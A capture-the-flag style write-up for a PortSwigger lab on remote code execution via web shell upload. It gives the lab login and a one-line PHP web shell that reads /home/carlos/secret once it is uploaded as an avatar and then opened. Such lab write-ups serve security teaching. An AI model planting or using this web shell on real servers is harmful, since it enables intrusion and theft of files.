# Lab-1: [Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem. 

**Aim :-** To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file ``` /home/carlos/secret ```. Submit this secret using the button provided in the lab banner. 

You can log in to your own account using the following credentials: ``` wiener:peter ```



## Solution
- Login as ``` wiener ```.
    - Username : ``` wiener ```.
    - Password : ``` peter ```.

- There will be a option to upload image.

- Copy the following code and save it in a file, name it as ``` exploit.php ```.
    - ``` <?php echo file_get_contents('/home/carlos/secret'); ?> ```.

- Open image in a new tab by going to ``` /files/avatars/exploit.php ```.

- Server will respond with a secret code, copy the code and submit as solution.